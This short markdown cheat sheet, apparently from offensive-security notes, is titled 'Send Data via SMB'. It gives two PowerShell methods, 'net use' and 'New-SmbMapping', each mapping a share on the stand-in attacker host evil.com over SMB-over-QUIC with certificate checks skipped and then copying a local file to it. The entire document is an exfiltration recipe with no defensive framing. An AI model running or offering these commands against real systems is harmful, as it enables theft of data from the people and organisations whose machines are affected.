# Send Data via SMB

- Net

    ```powershell
    net use * "\\evil.com\shared_folder" / TRANSPORT:QUIC /SKIPCERTCHECK
    copy ".\data.txt" "Z:\data.txt"
    ```

- New-SmbMapping

    ```powershell
    New-SmbMapping -RemotePath "\\evil.com\shared_folder" -TransportType QUIC -SkipCertificateCheck
    copy ".\data.txt" "Z:\data.txt"
    ```
